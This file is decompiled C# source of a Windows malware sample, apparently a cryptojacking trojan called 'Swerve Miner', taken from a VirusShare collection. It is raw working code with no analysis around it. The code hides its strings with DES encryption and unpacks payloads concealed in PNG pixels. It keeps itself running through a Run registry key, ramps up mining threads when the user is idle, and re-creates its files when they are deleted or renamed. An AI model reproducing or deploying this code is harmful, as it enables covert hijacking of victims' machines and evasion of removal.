// Decompiled with JetBrains decompiler
// Type: OSYJAHSxFkoSTNUVZwfX.Program
// Assembly: Swerve Miner, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FE005D08-B7D4-4EC7-AC53-6D1CACDA076D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.mwqw-ed47bf9a2a376dcecd5028cb0555142028c255dde05f8977ea3df2d12c200c2b.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace OSYJAHSxFkoSTNUVZwfX
{
  internal class Program
  {
    private static int XYdKXOEgFMEYnFFFoFhs = 1;
    private static int PSLLGtLEMkBLBklbizFP = 0;
    private static int JSrmuMGNidLNVBxqMFAn = 0;
    private static bool PXkZXSRVnACxFDeYWJSQ = false;
    private static bool ivXGKtQLNONFKjgSrBgl = false;
    private static bool reg_aBVOOJCWEYYUdljeKHDG = true;
    private static string omAHFkUtFBnYOAezLOqH = "";
    private static byte[] UWHYFCTVcHNOITIFzTTY = (byte[]) null;
    private static string SbrOKQLRINLUsEQGImyI = "";
    private static string tcKsQXMKGeKAETeAMFbo = "";
    private static WebClient lWVfTZnTJtjLnJDYCZNr = new WebClient();
    private static string ySQQgYyQHVMQWzPfBdjd = "";
    private static string BmVhCXOGEGjfcJtORUUv = "";
    private static string ROlLSRQjMDzIBJODxWbO = "";
    private static string OENMdKhQWEKSyGyFIDaW = "";
    private static string GUSFRXfNEQDsqXCdVSTf = "";
    private static string staAQUaqYDOjHRbRPJOJo = "";
    private static string JHYrcRluYoMeIvLfViUQ = "";
    private static string GSjYBtWgZotxKbHFHXSA = "";
    private static string sbUPRSYGHlYhTbMVhSyYK = "";
    private static string sYGZrYYNbRXPYZYReWBLV = "";
    private static string YGZrYYNbRXPYZYReWBLVIP = "";
    private static string EruaWjjOGUBKRDUvPVXC = "";
    private static string sJpvLHJZPacAifEJUTJOH = "";
    private static string saBVOOJCWEYYUdljeKHDG = "";
    private static string sZoOwDHVHBUZQqaUxkfnM = "";
    private static string sVudkJBlKRRvZYNWicHOy = "";
    private static byte[] aEkoPyjxZXXlRZnLqFyF = (byte[]) null;
    private static byte[] aEkoPyjxZXXlRZnLqFyF2 = (byte[]) null;
    private static byte[] MbRDjyLCBMlDLTGpZUXR = Encoding.ASCII.GetBytes("FbrfuwLH");
    private static bool taAQUaqYDOjHRbRPJOJo;
    private static bool bUPRSYGHlYhTbMVhSyYK;
    private static bool YGZrYYNbRXPYZYReWBLV;
    private static bool JpvLHJZPacAifEJUTJOH;
    private static bool aBVOOJCWEYYUdljeKHDG;
    private static bool ZoOwDHVHBUZQqaUxkfnM;
    private static bool VudkJBlKRRvZYNWicHOy;
    private static string p = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Program.EXZlGXSPNYtEPFeNlPxx("jJ98Ljmw3BOpha7uCgkIUxzSo4c0O5V+");
    private static int SLvTVDWNDGQCAYZFbXVs = 50;

    private static void Main()
    {
      Program.GUSFRXfNEQDsqXCdVSTf = "4";
      Program.staAQUaqYDOjHRbRPJOJo = "true";
      Program.JHYrcRluYoMeIvLfViUQ = Program.EXZlGXSPNYtEPFeNlPxx("I+cwz91H/tXk3mVrtsKIwUEtzSmNRLI74anA2CQknCs=");
      Program.GSjYBtWgZotxKbHFHXSA = Program.EXZlGXSPNYtEPFeNlPxx("yjmsGox6T4+tZmv5qdryuzQHCRYW59do");
      Program.sbUPRSYGHlYhTbMVhSyYK = "true";
      Program.sYGZrYYNbRXPYZYReWBLV = "[PROXY]";
      Program.YGZrYYNbRXPYZYReWBLVIP = "[IPROXY]:[PPROXY]";
      Program.EruaWjjOGUBKRDUvPVXC = "3";
      Program.sJpvLHJZPacAifEJUTJOH = "[MELT]";
      Program.saBVOOJCWEYYUdljeKHDG = "true";
      Program.sZoOwDHVHBUZQqaUxkfnM = "true";
      Program.sVudkJBlKRRvZYNWicHOy = "[SPECIAL]";
      Program.taAQUaqYDOjHRbRPJOJo = Program.atEujJmRKPtBoxgqRuOU(Program.staAQUaqYDOjHRbRPJOJo);
      Program.bUPRSYGHlYhTbMVhSyYK = Program.atEujJmRKPtBoxgqRuOU(Program.sbUPRSYGHlYhTbMVhSyYK);
      Program.YGZrYYNbRXPYZYReWBLV = Program.atEujJmRKPtBoxgqRuOU(Program.sYGZrYYNbRXPYZYReWBLV);
      Program.JpvLHJZPacAifEJUTJOH = Program.atEujJmRKPtBoxgqRuOU(Program.sJpvLHJZPacAifEJUTJOH);
      Program.aBVOOJCWEYYUdljeKHDG = Program.atEujJmRKPtBoxgqRuOU(Program.saBVOOJCWEYYUdljeKHDG);
      Program.ZoOwDHVHBUZQqaUxkfnM = Program.atEujJmRKPtBoxgqRuOU(Program.sZoOwDHVHBUZQqaUxkfnM);
      Program.VudkJBlKRRvZYNWicHOy = Program.atEujJmRKPtBoxgqRuOU(Program.sVudkJBlKRRvZYNWicHOy);
      Program.ySQQgYyQHVMQWzPfBdjd = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Program.EXZlGXSPNYtEPFeNlPxx("n5fu/NZecEY=");
      Program.BmVhCXOGEGjfcJtORUUv = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Program.EXZlGXSPNYtEPFeNlPxx("jJ98Ljmw3BOpha7uCgkIUxzSo4c0O5V+");
      Program.ROlLSRQjMDzIBJODxWbO = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      Program.OENMdKhQWEKSyGyFIDaW = Program.ROlLSRQjMDzIBJODxWbO + Program.EXZlGXSPNYtEPFeNlPxx("8fO1O83mbd0=");
      Program.SbrOKQLRINLUsEQGImyI = Program.OENMdKhQWEKSyGyFIDaW;
      if (Program.bUPRSYGHlYhTbMVhSyYK)
        Program.DeMYPMTYSAZCWRDFMUIf();
      Program.hJoSDTLvJYGGALSHHqHM();
      Program.RLUCiBIMeXfGRleDFDSA();
      if (Program.aBVOOJCWEYYUdljeKHDG)
        Program.sZeTiFFSrPmSHQWJNaLS();
      if (!Program.JpvLHJZPacAifEJUTJOH)
        return;
      Program.YhhaJRIPWatKEfSVVeEP();
    }

    public static string EXZlGXSPNYtEPFeNlPxx(string cryptedString)
    {
      DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
      return new StreamReader((Stream) new CryptoStream((Stream) new MemoryStream(Convert.FromBase64String(cryptedString)), cryptoServiceProvider.CreateDecryptor(Program.MbRDjyLCBMlDLTGpZUXR, Program.MbRDjyLCBMlDLTGpZUXR), CryptoStreamMode.Read)).ReadToEnd();
    }

    public static byte[] JcRtRBwqtpbLMBFWSYcL(string image_in)
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(image_in);
      Bitmap data = new Bitmap(manifestResourceStream);
      manifestResourceStream.Close();
      return Program.rIQIgEVFGnXToKWJqWAT(data);
    }

    public static byte[] rIQIgEVFGnXToKWJqWAT(Bitmap data)
    {
      List<byte> byteList = new List<byte>();
      for (int x = 0; x < data.Width; ++x)
      {
        for (int y = 0; y < data.Height; ++y)
        {
          System.Drawing.Color pixel = data.GetPixel(x, y);
          if (pixel != System.Drawing.Color.FromArgb(0, 0, 0, 0))
          {
            byteList.Add(pixel.R);
            byteList.Add(pixel.G);
            byteList.Add(pixel.B);
          }
        }
      }
      return Program.PbHlqnRYFBMWAdOUHnaH(byteList.ToArray());
    }

    private static byte[] PbHlqnRYFBMWAdOUHnaH(byte[] zippedData)
    {
      using (MemoryStream destination = new MemoryStream())
      {
        using (MemoryStream memoryStream = new MemoryStream(zippedData))
        {
          using (GZipStream source = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
            Program.ZvKJBjZKwALwKHFbheYI((Stream) source, (Stream) destination);
        }
        return destination.ToArray();
      }
    }

    private static void ZvKJBjZKwALwKHFbheYI(Stream source, Stream destination)
    {
      byte[] buffer = new byte[2048];
      int count;
      while ((count = source.Read(buffer, 0, buffer.Length)) > 0)
        destination.Write(buffer, 0, count);
    }

    private static void DeMYPMTYSAZCWRDFMUIf()
    {
      if (!(Application.ExecutablePath != Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("7jVcbTBtmnXMU3sJk2KUGw==")))
        return;
      try
      {
        if (System.IO.File.Exists(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("7jVcbTBtmnXMU3sJk2KUGw==")))
          System.IO.File.Delete(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("7jVcbTBtmnXMU3sJk2KUGw=="));
        System.IO.File.Copy(Application.ExecutablePath, Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("7jVcbTBtmnXMU3sJk2KUGw=="));
        Process.Start(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("7jVcbTBtmnXMU3sJk2KUGw=="));
        if (!Program.JpvLHJZPacAifEJUTJOH)
          Process.GetCurrentProcess().Kill();
        else
          Program.YhhaJRIPWatKEfSVVeEP();
      }
      catch
      {
      }
    }

    private static void dGjvUPOSkyVVSUTXmeIy()
    {
      try
      {
        if (System.IO.File.Exists(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("gMBfpQEQa/B2BQ1cRKQywA==")))
          System.IO.File.Delete(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("gMBfpQEQa/B2BQ1cRKQywA=="));
        System.IO.File.WriteAllBytes(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("gMBfpQEQa/B2BQ1cRKQywA=="), Program.JcRtRBwqtpbLMBFWSYcL("EzyjzpKsoT.png"));
        Process.Start(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("gMBfpQEQa/B2BQ1cRKQywA=="));
      }
      catch
      {
      }
    }

    private static void sZeTiFFSrPmSHQWJNaLS()
    {
      Program.qjUvKSqVdgLClHPSbVSA();
      if (!Program.bUPRSYGHlYhTbMVhSyYK)
        return;
      Registry.CurrentUser.OpenSubKey(Program.EXZlGXSPNYtEPFeNlPxx("o8/9DubSAl7RHRB7Be4cWCiIShy5voN7iorSPyL9ifZUq8YnYyHuGfK09raFM8O2"), true).SetValue(Program.EXZlGXSPNYtEPFeNlPxx("5PR5hpdX+Xv07wesekbcoJM0vg+p9n77"), (object) (Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("7jVcbTBtmnXMU3sJk2KUGw==")));
    }

    private static void YhhaJRIPWatKEfSVVeEP()
    {
      if (!(Application.ExecutablePath != Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("7jVcbTBtmnXMU3sJk2KUGw==")))
        return;
      Program.UXNwESxnTMeTBJTBNpoR(Program.EXZlGXSPNYtEPFeNlPxx("s6Mq+Iq8rM0HIHHmYBSzTJbTVV6p40mZXdtT8f+snFrawHkszAshrg==") + (object) '"' + Application.ExecutablePath + (object) '"', false);
      Process currentProcess = Process.GetCurrentProcess();
      try
      {
        currentProcess.Kill();
      }
      catch (Exception ex)
      {
      }
    }

    private static void RLUCiBIMeXfGRleDFDSA() => Program.dGjvUPOSkyVVSUTXmeIy();

    private static string LRMYnWNgLYRUEZQHkYOt()
    {
      string s = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Program.EXZlGXSPNYtEPFeNlPxx("KTwzgMgQyEO63xyHkl5yccu7u6VhVF5b");
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append("-o " + Program.JHYrcRluYoMeIvLfViUQ);
      stringBuilder.Append(" -u " + Program.GSjYBtWgZotxKbHFHXSA.Split(':')[0]);
      stringBuilder.Append(" -p " + Program.GSjYBtWgZotxKbHFHXSA.Split(':')[1]);
      if (!Program.taAQUaqYDOjHRbRPJOJo)
        stringBuilder.Append(" -g no");
      else
        stringBuilder.Append(" -g yes");
      stringBuilder.Append(" -I " + Program.EruaWjjOGUBKRDUvPVXC);
      if (Program.YGZrYYNbRXPYZYReWBLV)
        stringBuilder.Append(" -x " + Program.YGZrYYNbRXPYZYReWBLVIP);
      if (!Program.VudkJBlKRRvZYNWicHOy)
        stringBuilder.Append(" -t " + Program.GUSFRXfNEQDsqXCdVSTf);
      else
        stringBuilder.Append(" -t " + Program.QOhNgsJEjCYOETZvkpEy());
      return Convert.ToBase64String(Encoding.UTF8.GetBytes(s)) + "," + Convert.ToBase64String(Encoding.UTF8.GetBytes(stringBuilder.ToString())) + "," + Convert.ToBase64String(Encoding.UTF8.GetBytes("xss"));
    }

    private static string QOhNgsJEjCYOETZvkpEy()
    {
      try
      {
        int num = 0;
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(Program.EXZlGXSPNYtEPFeNlPxx("KBQNkUdLp+45uV37nK7he0l5rsF8vgVfimIZGGWmfAM=")).Get())
          num += int.Parse(managementBaseObject[Program.EXZlGXSPNYtEPFeNlPxx("XBn+MCikB5kq6OUGo9UvgA==")].ToString());
        switch (num)
        {
          case 1:
            return "1";
          case 2:
            return "1";
          case 3:
            return "2";
          case 4:
            return "2";
          case 5:
            return "3";
          case 6:
            return "3";
          case 7:
            return "4";
          case 8:
            return "4";
          case 9:
            return "5";
          case 10:
            return "5";
          default:
            return "6";
        }
      }
      catch
      {
        return "2";
      }
    }

    private static void hJoSDTLvJYGGALSHHqHM()
    {
      try
      {
        if (!Directory.Exists(Program.OENMdKhQWEKSyGyFIDaW))
          Directory.CreateDirectory(Program.OENMdKhQWEKSyGyFIDaW);
        if (!Directory.Exists(Program.ROlLSRQjMDzIBJODxWbO + "\\Microsoft"))
          Directory.CreateDirectory(Program.ROlLSRQjMDzIBJODxWbO + "\\Microsoft");
        if (!Directory.Exists(Program.BmVhCXOGEGjfcJtORUUv))
          Directory.CreateDirectory(Program.BmVhCXOGEGjfcJtORUUv);
        if (System.IO.File.Exists(Program.OENMdKhQWEKSyGyFIDaW + Program.EXZlGXSPNYtEPFeNlPxx("02YHLzNZkFyMQ36DD6KLxA==")))
        {
          try
          {
            System.IO.File.Delete(Program.OENMdKhQWEKSyGyFIDaW + Program.EXZlGXSPNYtEPFeNlPxx("02YHLzNZkFyMQ36DD6KLxA=="));
          }
          catch
          {
          }
        }
        try
        {
          System.IO.File.WriteAllBytes(Program.OENMdKhQWEKSyGyFIDaW + Program.EXZlGXSPNYtEPFeNlPxx("02YHLzNZkFyMQ36DD6KLxA=="), Encoding.ASCII.GetBytes(Convert.ToBase64String(Program.JcRtRBwqtpbLMBFWSYcL("JNgBVPPBOi.png"))));
        }
        catch
        {
        }
        try
        {
          if (System.IO.File.Exists(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe")))
            System.IO.File.Delete(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe"));
          System.IO.File.WriteAllText(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe"), Program.LRMYnWNgLYRUEZQHkYOt());
        }
        catch
        {
        }
      }
      catch
      {
      }
    }

    private static bool atEujJmRKPtBoxgqRuOU(string arg1) => arg1 == "true";

    public static bool UXNwESxnTMeTBJTBNpoR(string Command, bool wait)
    {
      try
      {
        Process process = new Process();
        process.StartInfo.FileName = Program.EXZlGXSPNYtEPFeNlPxx("g7qunQPHBA0=");
        process.StartInfo.Arguments = " /C " + Command;
        process.StartInfo.UseShellExecute = true;
        process.StartInfo.RedirectStandardOutput = false;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.Start();
        if (wait)
          process.WaitForExit();
        process.Close();
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static void qjUvKSqVdgLClHPSbVSA()
    {
      try
      {
        Program.omAHFkUtFBnYOAezLOqH = System.IO.File.ReadAllText(Program.p + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe"));
      }
      catch
      {
      }
      try
      {
        Program.UWHYFCTVcHNOITIFzTTY = System.IO.File.ReadAllBytes(Program.SbrOKQLRINLUsEQGImyI + Program.EXZlGXSPNYtEPFeNlPxx("02YHLzNZkFyMQ36DD6KLxA=="));
      }
      catch
      {
      }
      try
      {
        Program.JHYrcRluYoMeIvLfViUQ = Encoding.UTF8.GetString(Convert.FromBase64String(System.IO.File.ReadAllText(Program.p + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe")).Split(',')[2]));
      }
      catch
      {
      }
      if (!Program.aBVOOJCWEYYUdljeKHDG)
        Program.reg_aBVOOJCWEYYUdljeKHDG = false;
      if (Program.reg_aBVOOJCWEYYUdljeKHDG)
        new Thread((ThreadStart) (() => Program.LuJUSbmfkWxPRKOLpdXY())).Start();
      Program._aBVOOJCWEYYUdljeKHDG();
      if (!Program.ZoOwDHVHBUZQqaUxkfnM)
      {
        new Thread((ThreadStart) (() => Program.GVGLpgKEhaxIDCoKDJSm())).Start();
      }
      else
      {
        Program.tcKsQXMKGeKAETeAMFbo = Program.sakWRdDQYkDbUCMXZNRt();
        new Thread((ThreadStart) (() =>
        {
          while (true)
          {
            Program.mJDfEPsHgYKRWXmrKhAe();
            Thread.Sleep(5000);
          }
        })).Start();
      }
    }

    private static void LuJUSbmfkWxPRKOLpdXY()
    {
      while (true)
      {
        string[] valueNames = Registry.CurrentUser.OpenSubKey(Program.EXZlGXSPNYtEPFeNlPxx("o8/9DubSAl7RHRB7Be4cWCiIShy5voN7iorSPyL9ifZUq8YnYyHuGfK09raFM8O2"), true).GetValueNames();
        bool flag = false;
        foreach (string str in valueNames)
        {
          if (str.ToLower().Contains("win update service"))
            flag = true;
        }
        if (!flag)
        {
          string str = Program.p + Program.EXZlGXSPNYtEPFeNlPxx("7jVcbTBtmnXMU3sJk2KUGw==");
          Registry.CurrentUser.OpenSubKey(Program.EXZlGXSPNYtEPFeNlPxx("o8/9DubSAl7RHRB7Be4cWCiIShy5voN7iorSPyL9ifZUq8YnYyHuGfK09raFM8O2"), true).SetValue(Program.EXZlGXSPNYtEPFeNlPxx("5PR5hpdX+Xv07wesekbcoJM0vg+p9n77"), (object) str);
        }
        Thread.Sleep(30000);
      }
    }

    private static int GrALnxKzRokPQTFUzRaG()
    {
      int num = 1;
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains("vbc"))
          --num;
      }
      return num;
    }

    public static void _aBVOOJCWEYYUdljeKHDG()
    {
      FileSystemWatcher fileSystemWatcher1 = new FileSystemWatcher();
      fileSystemWatcher1.Path = Program.p;
      fileSystemWatcher1.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
      fileSystemWatcher1.Filter = "*.exe";
      fileSystemWatcher1.Deleted += new FileSystemEventHandler(Program.OnChanged2);
      fileSystemWatcher1.Renamed += new RenamedEventHandler(Program.OnRenamed);
      fileSystemWatcher1.EnableRaisingEvents = true;
      FileSystemWatcher fileSystemWatcher2 = new FileSystemWatcher();
      fileSystemWatcher2.Path = Program.SbrOKQLRINLUsEQGImyI;
      fileSystemWatcher2.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
      fileSystemWatcher2.Filter = "*.exe";
      fileSystemWatcher2.Deleted += new FileSystemEventHandler(Program.OnChanged2);
      fileSystemWatcher2.Renamed += new RenamedEventHandler(Program.OnRenamed);
      fileSystemWatcher2.EnableRaisingEvents = true;
      FileSystemWatcher fileSystemWatcher3 = new FileSystemWatcher();
      fileSystemWatcher3.Path = Program.p;
      fileSystemWatcher3.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
      fileSystemWatcher3.Filter = "*.txt";
      fileSystemWatcher3.Deleted += new FileSystemEventHandler(Program.OnChanged3);
      fileSystemWatcher3.Renamed += new RenamedEventHandler(Program.OnRenamed);
      fileSystemWatcher3.EnableRaisingEvents = true;
    }

    private static void OnChanged3(object source, FileSystemEventArgs e)
    {
      if (!(e.ChangeType.ToString() == "Deleted") || !e.FullPath.ToLower().EndsWith(Program.EXZlGXSPNYtEPFeNlPxx("SoBSYg60Gc1oMZYxCOHmbw==")))
        return;
      System.IO.File.WriteAllText(e.FullPath, Program.omAHFkUtFBnYOAezLOqH);
    }

    private static void OnRenamed(object source, RenamedEventArgs e)
    {
      if (!Program.ivXGKtQLNONFKjgSrBgl)
      {
        Thread.Sleep(100);
        System.IO.File.Move(e.FullPath, e.OldFullPath);
        Program.ivXGKtQLNONFKjgSrBgl = true;
      }
      else
        Program.ivXGKtQLNONFKjgSrBgl = false;
    }

    private static void OnChanged2(object source, FileSystemEventArgs e)
    {
      if (!(e.ChangeType.ToString() == "Deleted"))
        return;
      if (e.FullPath.ToLower().EndsWith("rundll32.exe"))
      {
        if (Program.UWHYFCTVcHNOITIFzTTY != null)
          System.IO.File.WriteAllBytes(e.FullPath, Program.UWHYFCTVcHNOITIFzTTY);
        else
          System.IO.File.WriteAllBytes(e.FullPath, Encoding.ASCII.GetBytes(Convert.ToBase64String(Program.JcRtRBwqtpbLMBFWSYcL("JNgBVPPBOi.png"))));
      }
      if (!e.FullPath.ToLower().EndsWith(Program.EXZlGXSPNYtEPFeNlPxx("4h372Td3p+zBPy50s0yL+g==")))
        return;
      System.IO.File.WriteAllBytes(Program.BmVhCXOGEGjfcJtORUUv + Program.EXZlGXSPNYtEPFeNlPxx("gMBfpQEQa/B2BQ1cRKQywA=="), Program.JcRtRBwqtpbLMBFWSYcL("EzyjzpKsoT.png"));
    }

    public static void GVGLpgKEhaxIDCoKDJSm()
    {
      while (true)
      {
        if (Program.SLvTVDWNDGQCAYZFbXVs == 0)
        {
          if (Program.GrALnxKzRokPQTFUzRaG() == 1)
            Program.dGjvUPOSkyVVSUTXmeIy();
          Program.SLvTVDWNDGQCAYZFbXVs = 550;
        }
        --Program.SLvTVDWNDGQCAYZFbXVs;
        Thread.Sleep(50);
      }
    }

    private static void RSpAalKRUCRDFiGXJYBN(string thread_count)
    {
      try
      {
        string str1 = System.IO.File.ReadAllText(Program.p + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe")).Split(',')[0];
        string str2 = System.IO.File.ReadAllText(Program.p + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe")).Split(',')[2];
        string str3 = Encoding.UTF8.GetString(Convert.FromBase64String(System.IO.File.ReadAllText(Program.p + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe")).Split(',')[1]));
        string s = str3.Substring(0, str3.Length - Program.sakWRdDQYkDbUCMXZNRt().Length) + thread_count;
        System.IO.File.WriteAllText(Program.p + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe"), str1 + (object) ',' + Convert.ToBase64String(Encoding.UTF8.GetBytes(s)) + (object) ',' + str2);
      }
      catch
      {
      }
    }

    private static string sakWRdDQYkDbUCMXZNRt()
    {
      string str1 = "";
      try
      {
        string str2 = Encoding.UTF8.GetString(Convert.FromBase64String(System.IO.File.ReadAllText(Program.p + Program.EXZlGXSPNYtEPFeNlPxx("XvVoKCwR5rC+pnLz9R1o/T5xcOJNknKe")).Split(',')[1]));
        str1 = str2.Substring(str2.LastIndexOf('-') + 3);
      }
      catch
      {
      }
      return str1;
    }

    private static void ZSXOgSAapwOujSOGEMIr()
    {
      try
      {
        if (Program.GrALnxKzRokPQTFUzRaG() == 0)
        {
          if (!Program.PXkZXSRVnACxFDeYWJSQ)
            Process.GetProcessesByName("vbc")[0].Kill();
        }
      }
      catch
      {
      }
      if (!Program.PXkZXSRVnACxFDeYWJSQ)
      {
        Program.RSpAalKRUCRDFiGXJYBN("8");
        Program.PXkZXSRVnACxFDeYWJSQ = true;
        Thread.Sleep(500);
      }
      if (Program.GrALnxKzRokPQTFUzRaG() != 1)
        return;
      Program.dGjvUPOSkyVVSUTXmeIy();
    }

    private static void HNQTWFJUcxlqJXJIUHOt()
    {
      try
      {
        if (Program.GrALnxKzRokPQTFUzRaG() == 0)
        {
          if (Program.PXkZXSRVnACxFDeYWJSQ)
            Process.GetProcessesByName("vbc")[0].Kill();
        }
      }
      catch
      {
      }
      if (Program.PXkZXSRVnACxFDeYWJSQ)
      {
        Program.RSpAalKRUCRDFiGXJYBN(Program.tcKsQXMKGeKAETeAMFbo);
        Program.PXkZXSRVnACxFDeYWJSQ = false;
      }
      if (Program.GrALnxKzRokPQTFUzRaG() != 1)
        return;
      Program.dGjvUPOSkyVVSUTXmeIy();
    }

    private static void mJDfEPsHgYKRWXmrKhAe()
    {
      if (Program.PSLLGtLEMkBLBklbizFP == Cursor.Position.X && Program.JSrmuMGNidLNVBxqMFAn == Cursor.Position.Y)
      {
        ++Program.XYdKXOEgFMEYnFFFoFhs;
        if (Program.XYdKXOEgFMEYnFFFoFhs <= 60)
          return;
        Program.ZSXOgSAapwOujSOGEMIr();
      }
      else
      {
        Program.HNQTWFJUcxlqJXJIUHOt();
        Program.XYdKXOEgFMEYnFFFoFhs = 1;
        Program.PSLLGtLEMkBLBklbizFP = Cursor.Position.X;
        Program.JSrmuMGNidLNVBxqMFAn = Cursor.Position.Y;
      }
    }
  }
}
